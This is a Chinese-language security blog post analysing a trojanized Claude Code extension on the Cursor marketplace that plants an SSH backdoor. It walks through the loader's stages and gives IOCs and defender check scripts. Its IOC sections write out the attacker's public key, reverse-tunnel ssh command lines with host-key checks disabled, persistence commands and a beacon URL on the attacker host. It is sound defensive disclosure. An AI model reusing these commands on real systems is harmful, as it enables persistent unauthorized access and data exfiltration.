---
title: "一个 66 行的 loader，和 5000 个装上它的开发者：Cursor 市场上架的 Claude Code 扩展被投毒"
date: 2026-10-30
slug: cursor-claude-code-extension-ssh-backdoor
tags: [供应链安全, Cursor, VSCode扩展, ClaudeCode, Anthropic, OpenVSX, SSH后门, 反向隧道, 恶意软件, IOC, 持久化, LaunchAgent, 定时任务, 凭据泄露, 开发者工具, 远控]
category: 安全/事件分析
author: FreeLAMP.com
original_source: "⭐ 一手核对：OpenSourceMalware《Trojanized Claude Code Extension Plants an SSH Backdoor》（6mile / Paul McCarty，2026-10-30）+ ox.security 技术分析 + Cursor 官方公告（经 The Hacker News / Unite.AI / Help Net Security 完整引用）+ Reddit r/cybersecurity 实测反馈"
original_date: 2026-10-30
original_url: "https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor"
description: "2026 年 10 月 29 日，一个自称 anthropic.claude-code 版本 2.1.313 的扩展被投毒后上架到 Cursor 的扩展市场，11 小时内触达最多 5000 名用户。它与正版扩展的唯一差别是 extension.js 开头被插入了一个 66 行的 IIFE：它往 ~/.ssh/authorized_keys 追加一把名为 svc-telemetry 的 Ed25519 公钥、尝试开启本机 SSH 服务、把内嵌私钥解码成 .stk_<10hex> 建立到 134.209.82.225 的反向隧道、并按平台装持久化（macOS LaunchAgent / Linux crontab / Windows 计划任务），最后用 HTTP beacon 外传主机侦察信息。本文核对了 OpenSourceMalware 与 ox.security 两份独立技术分析、Cursor 官方公告与修复脚本要点，并给出一份「卸载不等于清除」的排查清单 —— 这是本文最该带走的一点。"
published: true
---

> ⭐ **本文核对的一手材料**：
> - **[OpenSourceMalware 原始分析](https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor)**（**6mile / Paul McCarty**，2026-10-30 09:42，含 IOC、文件哈希、攻击链表）
> - **[ox.security 技术分析](https://www.ox.security/blog/malicious-claude-code-extension-cursor-ssh-backdoor/)**（含 Cursor 官方公告引述、VSIX 哈希、受影响判定脚本）
> - **Cursor 官方公告**（`@cursor_ai`，经 The Hacker News / Unite.AI / Help Net Security 完整引用）
> - **Reddit r/cybersecurity** 现场实测反馈（含 CrowStrike 告警的实际案例）
> - ⚠️ **本文为**解读**。**第三节的代码逻辑拆解为笔者依据原始分析所做的整理；第六节的「为什么这类攻击有效」与第八节的清单为笔者补充。**
> ⚠️ **安全边界**：本文只做**防守方**分析，**不提供任何可运行的利用代码，也不复现 payload**。

## 一句话结论

**这不是一个「恶意扩展做了什么」的常规故事，而是一个关于「分发渠道」的故事 —— 因为这个恶意扩展里最有攻击力的部分，恰恰是它的无害。**

**⭐ 我认为最值得记的三个数字：**

| | |
|---|---|
| **66 行** | 恶意 loader 的全部长度 —— 插在 extension.js 开头，正版代码在它之后照常运行 |
| **11 小时** | 恶意版本在 Cursor 市场里的上架时长（10-29 02:27 → 13:35 PT） |
| **5,000** | Cursor 官方给出的最大受影响用户数 |

**⭐ 而整个攻击的「技术含量」低得出奇 —— 它不需要任何漏洞：**

> **它只是往你的 `~/.ssh/authorized_keys` 里加了一把公钥。**

**用户的电脑上不需要点任何东西，不需要利用任何 CVE，甚至不需要跟 Claude 对话。** **「加载这个扩展」本身就够了。**

## 一、事件轮廓

### 1.1 时间线

| 时间 | 事件 |
|---|---|
| **10-29 02:27 PT** | 恶意版本 `2.1.313` 上架到 Cursor 扩展市场 |
| **10-29 13:35 PT** | Cursor 撤下该版本并关停整个市场（暴露窗口约 **11 小时**） |
| 期间 | 最多 **5,000** 名用户安装/更新到了该版本 |
| 之后 | Cursor 审计访问权限、**轮换密钥**、重建市场，确认无其他扩展被篡改后恢复 |
| 之后 | 与托管方合作，**把攻击者服务器下线** |
| **10-30** | OpenSourceMalware / ox.security 公开技术分析；Reddit 上出现实测反馈 |

**⭐ Cursor 的官方声明：**

> **「We identified a security incident affecting a modified Claude Code VS Code extension accessed through our Cursor IDE extension marketplace, impacting at most 5,000 users.」**
>
> **「This malicious version of the extension was not developed by Anthropic. It does not impact other extensions downloaded from the cursor[.]com/marketplace, Grok Bot, Grok, or our other SpaceXSI product.」**

### 1.2 ⭐⭐ 一个必须先说清的更正：不是 Open VSX

**⭐ 而这条新闻在传播过程中经历了一次「归因修正」，我认为值得单独点出来 —— 因为这正是**供应链事件里最容易搞错的一环**：**

**最初 OpenSourceMalware 的文章标题指向 Open VSX**（那个 Cursor / Windsurf 等 VS Code 衍生编辑器实际使用的扩展市场）。**但文章后来加了一条更新：**

> **「UPDATE: OpenSourceMalware has been contacted by Cursor and they've let us know that the Claude Code extension in the Cursor Marketplace experienced some form of compromise today and this is the origin of the malicious Claude Code extension, not Open-VSX.」**

**⭐ 而 The Hacker News 也专门做了更正说明：**

> **「(An earlier version of the story stated that the extension on the Open VSX registry was compromised. The incident has since been traced back to a compromise of the Cursor VS Code Marketplace.)」**

**⭐ 而 Help Net Security 解释了为什么最初会误判 —— 这一点其实很反直觉：**

> **「The malicious package, version 2.1.313, was published on Open VSX, an open-source marketplace for VS Code extensions run by the Eclipse Foundation. VS Code's default extension store is Microsoft's Visual Studio Marketplace, which never carried the compromised extension. Its terms of use limit it to Microsoft's own products, so editors built on the open-source VS Code codebase, including Cursor and Windsurf, can't use it and rely on Open VSX instead.」**

**⭐ 也就是说：Cursor 的市场是**自己的**，它把扩展**镜像**到 Open VSX。** 最初看到「Open VSX 上有毒版本」很合理 —— 但毒源是 Cursor 自己的市场，Open VSX 是被同步波及的。**

**⭐ 而这个区别在防守上是有意义的：**

| | 如果是 Open VSX 被攻破 | 实际是 Cursor 市场被攻破 |
|---|---|---|
| **受影响编辑器** | 所有用 Open VSX 的（Cursor、Windsurf、VSCodium…） | **只有 Cursor 及其衍生品** |
| **防守动作** | 撤销 Open VSX 凭据 | **审计 Cursor 市场的发布流水线** |
| **其他用户** | Windsurf 用户也要紧急自查 | **Windsurf 用户不受影响** |

**⭐ 所以「用 Open VSX 的都要查一下」是一个**基于误判的结论**。**

### 1.3 ⭐ 什么被污染了，什么没有

**OpenSourceMalware 列得很清楚：**

**被污染的：**
- Cursor 市场上架的 Claude Code 扩展，版本 **2.1.313**

**没被污染的：**
- ⭐ **`@anthropic-ai/claude-code` 这个 NPM 包**
- ⭐ **Open VSX 上的扩展**
- ⭐ **微软 VSCode 商店里的 Claude 扩展**

**⭐ 而「唯一有差别的东西」这句话是关键：**

> **「The unpacked extension is exactly like the normal version, and the bundled binary is the official binary as well. The only thing that's different is the extension.js file.」**

**—— 解包后与正版完全一致，内置的二进制也是官方的，**只有一个文件不同**：`extension.js`。**

**⭐ 我认为这一点是整个攻击最高明的地方，后面第六节会展开。**

## 二、⭐⭐ 恶意 loader 做了什么

**⭐ 而这里的信息量最大 —— 因为 ox.security 引用了 Cursor 官方识别出的实际命令行。**

### 2.1 注入位置：66 行，在最前面

**OpenSourceMalware 的静态分析描述：**

> **「The first line starts a standalone, immediately invoked function that imports Node.js process, filesystem, operating-system, HTTP, and cryptographic modules. That function ends at line 66. Only after it finishes does the expected bundled extension begin. **This placement matters: the user doesn't need to begin a Claude conversation. Loading the extension module is enough.**」**

**⭐ 我把这句话强调一下 —— 它是整个攻击的「触发条件」定义：**

| | |
|---|---|
| **不需要** | 开始一次 Claude 对话 |
| **不需要** | 运行任何特定命令 |
| **不需要** | 点任何按钮 |
| **只需要** | **VS Code 加载了这个扩展模块** |

**⭐ 而且还有一个细节值得注意 —— 它避开了包管理器的生命周期钩子：**

> **「The package declares no install, build, prepare, preinstall, or postinstall scripts, so the malicious behavior occurs at extension runtime rather than through a package-manager lifecycle hook.」**

**⭐ 我认为这一点是刻意的设计 —— 因为 `postinstall` 这类钩子是**供应链审计的重点扫描区**。**把 payload 藏进「运行时」而不是「安装时」，正好绕开了大部分扫描逻辑。**

### 2.2 阶段一：主机侦察

**ox.security 列出的采集内容：**

- 主机名（hostname）
- 本地用户名
- 操作系统与 CPU 架构
- 家目录路径与当前工作目录
- **全局 Git 邮箱**（`git config --global user.email`）
- 最多 **40 个**环境变量名，其中含 `KEY`、`TOKEN`、`SECRET`、`PASS`、`AWS`、`GCP`
- 公共 IP（通过 `ifconfig.me` 和 `api.ipify.org` 查询）

**⭐ 关于最后一条，ox.security 特别提醒了一句我觉得很有必要的话：**

> **「Both are legitimate services, and connections to them alone should not be treated as an indicator of compromise.」**

**—— 因为这两个服务太常见了，很多正常工具也会查。** **拿它当 IOC 报警，会淹在误报里。**

### 2.3 ⭐ 阶段二：authorized_keys 注入

**⭐ 这是整个攻击的核心动作，而且干净利落：**

**注入的公钥：**

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry
```

**指纹：**
```
SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk
```

**⭐ 而 `svc-telemetry` 这个注释是刻意选的 —— ox.security 的描述：**

> **「The key is labeled `svc-telemetry`, an innocuous-looking comment intended to resemble an administrative account.」**

**⭐ 我认为这个细节是整个事件里最值得学的一课 —— 后面第六节专门讲。**

**OpenSourceMalware 记录的完整动作序列：**

| 步骤 | 动作 |
|---|---|
| 1 | 创建 `~/.ssh`（若不存在） |
| 2 | `chmod 0700 ~/.ssh` |
| 3 | 追加 Ed25519 公钥到 `~/.ssh/authorized_keys` |
| 4 | `chmod 0600 authorized_keys` |
| 5 | **若标记已存在，则记录而不重复添加** |

**⭐ 第 5 条有意思 —— 它做了幂等处理，说明这个 payload 被设计成可以**重复运行而不留痕迹**。**

### 2.4 ⭐ 阶段三：尝试开启本机 SSH 服务

**这一步是条件性的，而且基本会失败：**

| 平台 | 做法 |
|---|---|
| **macOS** | 检查 Remote Login，未开启则 `sudo -n systemsetup -setremotelogin on` |
| **Linux** | 检查 `sshd` / `ssh` 的 `systemctl` 状态，尝试多种启动命令 |
| **Windows** | PowerShell 安装 OpenSSH Server、配置自启、启动 `sshd`（`Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`） |

**⭐ 而 Cursor 官方对这一步的评估很冷静：**

> **「Enabling the local SSH service requires administrator privileges, which the extension typically would not have. According to Cursor, errors in the malicious code meant this step failed except in highly unusual circumstances where Cursor was launched with administrator privileges. **As a result, the attacker could not log in through the tunnel on those hosts.**」**

**⭐ 「As a result, the attacker could not log in through the tunnel on those hosts.」**

**—— 也就是说：反向隧道虽然建起来了，但**没有可用的 SSH 服务端口可以转发**，攻击者实际上登不进去。**

**⭐ 而 ox.security 紧接着加了一句我觉得极其重要的话：**

> **「However, the failed SSH-service step does **not** mean the payload was harmless: the extension still adds the attacker's SSH key, installs persistence, and sends host information to the attacker.」**

**⭐ 我想把这句单独强调，因为它是本文最该带走的一条：**

> **「登录通道没打开」和「机器没被入侵」是两回事。**
> **公钥已经写进去了，持久化已经装上了，主机信息已经外传了。**

### 2.5 ⭐ 阶段四：反向 SSH 隧道

**⭐ 这是整个攻击里技术含量最高的一环 —— 而且它的巧妙之处在于「反向」二字。**

**机制：**

**payload 内嵌一段 base64 编码的 OpenSSH 私钥，解码到临时文件 `.stk_<identifier>`**（identifier 由主机名和家目录派生）。

**然后反复连接：**
```
tunnel@134.209.82.225
```

**核心转发请求：**
```
-N -R '*:0:localhost:22'
```

**⭐ 我解释一下这个参数的意思：**

**`-R` 是「远程端口转发」。** **`-R '*:0:localhost:22'` 的意思是：请在远端服务器上分配一个随机端口，把连到该端口的流量转发回我这边的 `localhost:22`。**

**—— 也就是在攻击者的服务器上开一个「洞」，反向连回受害者的 SSH。**

**⭐ 而 OpenSourceMalware 自己也点出了这一点：**

> **「Whether that port is reachable beyond the C2 host depends on the server's SSH configuration, but the operator controlling the server can use the tunnel directly.」**

**⭐ 连接参数（Cursor 识别出的）：**

```
StrictHostKeyChecking=no
UserKnownHostsFile=/dev/null
ServerAliveInterval=30
ServerAliveCountMax=3
ExitOnForwardFailure=yes
IdentitiesOnly=yes
```

**⭐ 以及「60 秒重连」和「优先用 autossh，没有则用 ssh」。**

**⭐ 而内嵌私钥的指纹是：**
```
SHA256:7e0a52885fadee05544a9e99eb18c792bec05900a5e1a66d68f8383decb0e278
```
**（ox.security 给的格式是 `SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ`，同一把钥匙的不同 base64 表示。）**

### 2.6 ⭐ 阶段五：按平台的持久化

**OpenSourceMalware 的三分支实现：**

**macOS：**
```
~/.config/.smt
~/.config/.smtk
~/Library/LaunchAgents/com.apple.sysmond.plist
```

**⭐ 而 `com.apple.sysmond` 这个名字是**精心伪装**的：**

> **「The `com.apple.sysmond` name is deceptive; this user LaunchAgent is not an Apple component.」**

**—— 它模仿的是 Apple 自己的 `sysmond`（系统监视守护进程）命名风格。** **一个粗心的用户或管理员在 `launchctl list` 里看到它，很可能以为是系统的。**

**Linux：**
```
~/.config/.smt
~/.config/.smtk
~/.config/.smtk  → 加入用户 crontab 的 @reboot 条目
```

**Windows：**
```
%USERPROFILE%\.config\smt.cmd
%USERPROFILE%\.config\smtk
计划任务 SysMon（尝试以 SYSTEM 运行）
失败则回退：%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd
```

**⭐ 而 `.smt` 脚本的作用是：重建私钥 + 持续拉起隧道。**

**⭐ 我注意到三个平台的文件名高度一致（`.smt` / `.smtk` / `smt.cmd`），只有扩展名不同 —— 这说明 payload 是**同一套代码**按平台分支适配的。**

### 2.7 阶段六：HTTP beacon

```
http://134.209.82.225:8099/beacon
http://127.0.0.1:8099/beacon
```

**⭐ 而关于 beacon 收到响应之后会做什么，OpenSourceMalware 的表格里写得很干脆：**

| Stage | Behavior | Outcome |
|---|---|---|
| **C2 response** | Beacon completes | **Response drained and ignored**（响应被读掉并丢弃） |

**⭐ 也就是说：这份 payload 本身**不执行任何来自 C2 的指令**。**

### 2.8 ⭐⭐ 它不下载任何东西

**⭐ 而 OpenSourceMalware 专门开了一节回答这个问题，我觉得这个区分非常专业：**

> **「No additional executable or script is downloaded by the injected loader. Its network behaviour consists of public-IP text lookups, JSON beacon uploads, and an interactive SSH tunnel. The shell and batch scripts and tunnel keys are generated or decoded from content already inside the extension. They are not secondary downloads.」**
>
> **「That distinction does not reduce the severity: the tunnel provides an operator-controlled route to the victim's SSH service. **Follow-on commands or files transferred after access would not appear in this static artifact.**」**

**⭐ 我把这段的逻辑翻译一下：**

**「静态分析看不出二阶段」** ≠ **「没有二阶段」。**

**—— 因为隧道本身就是一条「操作者控制的通道」。** **后续通过隧道传输什么，静态分析这个文件是看不出来的。**

**⭐ 而这也解释了 ox.security 那句更狠的结论：**

> **「Importantly, **uninstalling the malicious extension may not be sufficient**, because the payload drops standalone persistence scripts that can continue running after the extension is removed.」**

## 三、⭐⭐⭐ 攻击链全景

**⭐ OpenSourceMalware 给了一张非常清晰的表，我把它原样翻译过来（并保留它的「Confirmed / Conditional」标注 —— 这种标注方式很值得学）：**

| 阶段 | 触发条件 | 行为 | 结果 |
|---|---|---|---|
| **执行** | VS Code 加载 `extension.js` | 插入的 IIFE 在正版代码前运行 | ⭐ **Confirmed** |
| **接入** | 存在家目录 | 添加 `svc-telemetry` 公钥 | ⭐ **Confirmed** |
| **服务设置** | 平台分支 | 尝试启用 SSH / Remote Login | ⚠️ **Conditional on OS and privileges** |
| **隧道** | 无匹配的 Unix 隧道 | 落地内嵌密钥并启动反向 SSH 循环 | ⭐ **Confirmed code path** |
| **持久化** | 平台分支 | LaunchAgent / cron / 计划任务 / Startup 项 | ⚠️ **Conditional on OS** |
| **侦察** | 1.5 秒定时器 | 查询公共 IP 并发两次 beacon | ⭐ **Confirmed** |
| **C2 响应** | beacon 完成 | 响应被读掉并丢弃 | ⭐ **No execution path** |
| **额外下载** | 任何注入路径 | 未发现下载器 | ⭐ **None** |

**⭐ 我想强调「1.5 秒定时器」这个细节 —— 它说明 beacon 不是一次性的，而是定时重复的。**

## 四、⭐ 到底有多少人受影响

**⭐ Cursor 官方给的上限是「at most 5,000 users」，暴露窗口约 11 小时。**

**⭐ 而 ox.security 补充了受影响的构建：**

| 包 | 版本 | 市场 | 被篡改的构建 | 暴露窗口（PT） | 状态 |
|---|---|---|---|---|---|
| `Anthropic.claude-code` | 2.1.313 | Cursor VS Code 扩展市场 | **darwin-arm64（macOS）**、**win32-x64（Windows）** | 10-29 约 02:27 – 13:35 | 已移除 |

**⭐ 我注意到一个细节：被篡改的构建只有 **darwin-arm64** 和 **win32-x64** 两个** —— 也就是说 **Linux 构建没被投毒**（至少没被发现）。**

**⭐ 而 Reddit 上那条实测反馈特别有价值，因为它来自「中招者」而不是研究者：**

> **「We got hit by this one today, thankfully crowstrike alerted us on the reverse shell.」**

**⭐ 「幸好 CrowStrike 在反向 shell 上给我们告警了」—— 这句来自一位真实的受害者。**

**⭐ 它同时说明了两个事实：**
1. **攻击确实成功了**（有人真的中招）
2. **发现靠的是 EDR**（CrowStrike 这类终端检测产品），**不是靠扩展市场本身**

**⭐ 而另一条评论指出了「市场被关停」这个动作的另一个动机：**

> **「XAI / Cursor took down their marketplace as a result but they are trying to hide the real reason why it's down.」**

## 五、⭐⭐⭐ 防守方清单

**⭐ Cursor 官方给的判定脚本很实用，我原样收录（这是**防守方**用途，不是攻击手法）：**

**macOS：**
```bash
grep -qs svc-telemetry ~/.ssh/authorized_keys && echo "svc-telemetry key found" || echo "No key found; machine not impacted"
```

**Windows（PowerShell）：**
```powershell
$files = "$HOME.ssh\authorized_keys", "C:\ProgramData\ssh\administrators_authorized_keys" | Where-Object { Test-Path $_ }
if ($files -and (Select-String svc-telemetry $files)) { "svc-telemetry key found" } else { "No key found; machine not impacted" }
```

**⭐ Cursor 官方给的处置建议（ox.security 引用）：**

1. **检查影响** —— 跑上面的判定脚本，搜端点、网络与扩展安装遥测里的 IOC
2. **隔离受影响主机** —— 任何有 payload 执行或后门安装证据的系统都要隔离
3. **修复** —— 移除未授权的 SSH 公钥、持久化机制、运行中的隧道进程，并评估**是否应该重建主机**
4. ⭐ **「Uninstalling the extension alone may not be sufficient.」**

**⭐ 而 Cursor 还提供了官方修复脚本**（据 Unite.AI 引述）：
- `remediate-macos.sh` —— **必须以受影响用户身份运行，不能用 root**
- `remediate-windows.ps1` —— **必须在管理员权限的 PowerShell 里运行**
- 两者会移除恶意扩展、持久化机制、运行中的隧道进程和攻击者的 SSH 公钥，**并且在有残留时以非零状态退出**

**⭐ ox.security 的最后一句，我认为比任何技术细节都重要：**

> **「Because this implant creates an interactive path to SSH, its observable files may not represent the full compromise. Review SSH, shell, process, VS Code, authentication, and network logs for follow-on activity. **Rebuilding the host is safer than assuming removal of known artifacts restores trust.**」**

**—— 「移除已知产物 ≠ 恢复信任」。**

**⭐ 我把完整 IOC 整理成一张表：**

### 包与文件

| 类型 | 值 |
|---|---|
| 受影响包 | `anthropic.claude-code@2.1.313` |
| 被改文件 | `extension.js`（在 `anthropic.claude-code-2.1.313-darwin-arm64` / `-win32-x64` 目录内） |
| VSIX SHA-256（darwin-arm64） | `432ccdee3801f99e52b8fe31f69ea9870118e96ea7ef9ecabed1479621b5ab62` |
| VSIX SHA-256（win32-x64） | `3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081` |
| `extension.js` SHA-256 | `ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15` |

### 网络

| 类型 | 值 |
|---|---|
| 攻击者端点 | `134.209.82.225` |
| 反向 SSH | `tunnel@134.209.82.225`，TCP 22 |
| 外部 beacon | `http://134.209.82.225:8099/beacon`（HTTP POST） |
| 本地 beacon 尝试 | `127.0.0.1:8099/beacon`（loopback） |
| 公共 IP 查询 | `ifconfig.me`、`api.ipify.org` ⚠️ **合法服务，单独访问不算 IOC** |

### SSH

| 类型 | 值 |
|---|---|
| 未授权公钥 | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry` |
| 未授权公钥指纹 | `SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk` |
| 隧道私钥指纹 | `SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ` |

### 文件与持久化

| 平台 | 路径 |
|---|---|
| **macOS** | `~/.ssh/authorized_keys`；`~/.config/.smt`；`~/.config/.smtk`；`$TMPDIR/.stk_<10 hex>`；`~/Library/LaunchAgents/com.apple.sysmond.plist` |
| **Windows** | `%USERPROFILE%\.ssh\authorized_keys`；`%USERPROFILE%\.config\smt.cmd`；`%USERPROFILE%\.config\smtk`；`%TEMP%\.stk_<10 hex>`；计划任务 `SysMon`；`%APPDATA%\...\Startup\sysmon.cmd` |
| **Linux** | `~/.config/.smt`；`~/.config/.smtk`；用户 crontab 的 `@reboot` 条目 |

### 进程与命令行

```
ssh -N -R '*:0:localhost:22'
autossh -M 0
schtasks /create /tn SysMon
systemsetup -setremotelogin on
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
```

## 六、⭐⭐ 我的评价：为什么这个攻击有效

### 6.1 ⭐⭐ 它把「无害」当成了武器

**⭐ 我认为这个攻击最聪明的地方，不是任何一行代码，而是它的「呈现方式」：**

| 维度 | 恶意版本 | 正版版本 |
|---|---|---|
| **扩展 ID** | `anthropic.claude-code` | 相同 |
| **版本号** | `2.1.313` | 相同 |
| **界面** | 一样 | 一样 |
| **内置二进制** | ⭐ **官方正版** | 官方正版 |
| **功能** | ⭐ **完全正常** | 正常 |
| **解包后差异** | ⭐ **只有一个文件** | — |

**⭐ OpenSourceMalware 的结论：**

> **「This sample demonstrates an effective way to weaponize a trusted developer tool: place a compact backdoor before a large legitimate bundle, suppress errors, and let the expected application continue. **The extension retains its normal interface while quietly establishing durable SSH access.**」**

**⭐ 我把这套手法抽象成一句：**

> **把 66 行放在 5 万行前面，让用户和工具链都「看见」后面那个正常的东西。**

**⭐ 而这恰恰是「按版本号信任」这种习惯的失效点** —— 因为：

| 检查方式 | 结果 |
|---|---|
| 「扩展名对吗？」 | ✅ 对 |
| 「版本号是最新的吗？」 | ✅ 对 |
| 「功能正常吗？」 | ✅ 对 |
| 「二进制是官方的吗？」 | ✅ 对 |
| **「extension.js 是不是官方的？」** | ❌ **不是** |

**⭐ 而最后这一项，恰好是最少人做的一项 —— 因为它需要「拿到官方版本做逐字节比对」，成本远高于前几项。**

### 6.2 ⭐⭐ 而 `svc-telemetry` 这个名字，是一门单独的学问

**⭐ 我想单独说说这个注释名，因为它体现的东西比技术更深。**

**攻击者给这把钥匙起名叫 `svc-telemetry`。**

**⭐ 我推测它同时满足三个条件：**

1. **看起来像系统组件** —— `svc-` 前缀 + `telemetry` 是运维语境里的常见词
2. **看起来无害** —— 「遥测」听起来像是某个监控 agent
3. **能混在一堆真实密钥里** —— `~/.ssh/authorized_keys` 里通常有几十条，多一条不起眼

**⭐ 而这一招的有效性可以用一个事实印证：**

**Reddit 那位中招者，是靠 CrowStrike 告警才发现的** —— **不是靠「我看到 authorized_keys 里多了个奇怪的东西」。**

**⭐ 我认为这就是「命名伪装」的力量：它把「需要专业知识才能识别的攻击」，降级成了「需要正好留心才能识别的攻击」。**

**—— 顺便说，这也解释了为什么攻击者要**只改一个文件**：改动越多，越容易被 diff 出来。**

### 6.3 ⭐ 而「市场被关停」这个动作，本身是双刃剑

**⭐ 我认为 Cursor 的处置是正确且果断的（撤下 → 关停整个市场 → 审计 → 轮换密钥 → 重建 → 恢复）：**

**⭐ 但那句 Reddit 评论提出的质疑，也值得行业认真对待 —— 关停市场是一个「高影响、高可感知」的动作，而「掩盖真实原因」会损害用户信任。**

**⭐ 而 Cursor 的处理其实是对的**：它公开说明了受影响范围（最多 5000 用户）、哪些扩展没受影响（其他所有扩展、Grok Bot、Grok、SpaceXSI）、以及最关键的一句：**

> **「This malicious version of the extension was not developed by Anthropic.」**

**—— 把「Anthropic 的扩展被投毒」和「Anthropic 投毒了自己的扩展」区分开，这一句对用户的信任修复至关重要。**

### 6.4 ⭐⭐ 而最该带走的一句，是这个

**⭐ 我认为这个事件的真正教训，浓缩在 ox.security 的这两段里：**

> **「However, the failed SSH-service step does not mean the payload was harmless: the extension still adds the attacker's SSH key, installs persistence, and sends host information to the attacker.」**
>
> **「Uninstalling the extension alone may not be sufficient, because the payload drops standalone persistence scripts that can continue running after the extension is removed.」**

**⭐ 我的归纳是三条：**

**① 「攻击没成功」和「机器没被入侵」是两回事。**
**即使 SSH 服务没开起来（攻击者登不进去），公钥、持久化、情报外传这三件事都已经完成了。**

**② ⭐ 卸载扩展 ≠ 清除后门。**
**payload 的设计目标就是「活得比扩展久」** —— 扩展一卸载，持久化脚本继续跑，每 60 秒重连一次。**

**③ ⭐ 如果系统建立了交互式通道，「已知的文件」就只是入侵的表面。**
**—— 这是最反直觉但最重要的一条。**

## 七、证据边界

| 结论 | 状态 |
|---|---|
| 恶意版本 2.1.313 在 Cursor 市场上架约 11 小时 | ⭐ **Cursor 官方确认** |
| 最多 5,000 用户受影响 | ⭐ **Cursor 官方**（“at most 5,000 users”） |
| 投毒源是 Cursor 市场，不是 Open VSX | ⭐ **Cursor 明确告知 OpenSourceMalware，已更正** |
| 受影响构建为 darwin-arm64 与 win32-x64 | ⭐ **ox.security** |
| payload 的具体行为（key 注入 / 隧道 / 持久化 / beacon） | ⭐ **OpenSourceMalware 静态分析 + Cursor 官方确认** |
| **攻击者如何攻破 Cursor 市场的发布流水线** | ⚠️ **未知** —— Cursor 官方说「The exact method attackers used to introduce the unauthorized update remains unclear」 |
| 攻击者服务器已被下线 | ⭐ **Cursor / ox.security**（合作托管方） |
| 实际有多少机器被完整入侵 | ⚠️ **未知** —— 唯一公开的现场案例只有 Reddit 一条 |

**⭐ 而最后一行是我认为最需要保留的克制：** **官方说的是「最多 5,000 人下载了这个版本」，而「有多少人真的被完整入侵」，目前没有公开数据。** **这两者之间的差距，靠的是「SSH 服务能否开启」这个条件 —— 而 ox.security 说，因为恶意代码里的错误，这一步除了极罕见的以管理员权限启动 Cursor 的情况外都失败了。**

## Sources

- ⭐ 一手：[OpenSourceMalware — Trojanized Claude Code Extension Plants an SSH Backdoor](https://opensourcemalware.com/blog/trojanized-claude-code-extension-plants-persistent-ssh-backdoor)（6mile / Paul McCarty，2026-10-30 09:42 UTC）
- ⭐ 一手（技术细节 + Cursor 官方引述）：[ox.security — Malicious Claude Code Extension (2.1.313) in Cursor Marketplace Plants Attacker SSH Key and Persistence](https://www.ox.security/blog/malicious-claude-code-extension-cursor-ssh-backdoor/)（2026-10-30）
- ⭐ 一手（Cursor 官方声明）：[The Hacker News — Official Claude Code Extension on Cursor Marketplace Trojanized with Persistent SSH Backdoor](https://thehackernews.com/2026/10/official-claude-code-vs-code-extension.html)（含更正说明）
- 一手（暴露窗口、5,000 用户、VSIX 哈希）：[Help Net Security — Claude Code extension poisoned with persistent SSH backdoor](https://www.helpnetsecurity.com/2026/10/30/claude-code-extension-ssh-backdoor/)
- 一手（修复脚本细节）：[Unite.AI — Cursor Discloses SSH Backdoor Attempt in Malicious Claude Code Extension](https://www.unite.ai/cursor-discloses-ssh-backdoor-attempt-in-malicious-claude-code-extension)
- 现场反馈：[Reddit r/cybersecurity — Cursor marketplace Powned](https://www.reddit.com/r/cybersecurity/comments/1xj6zlw/cursor_marketplace_powned/)
- Cursor 官方公告：`https://x.com/cursor_ai/status/2116074289053175808`

---

（说明：所有引号内内容、IOC、哈希与时间点均来自上述一手材料；**第六节的抽象分析与判断为笔者观点**。**本文不含可运行的利用代码，不复现 payload，不提供攻击基础设施的操作方法** —— 事件分析的目的是让防守方理解这种攻击的形态，并知道自己该查什么。）
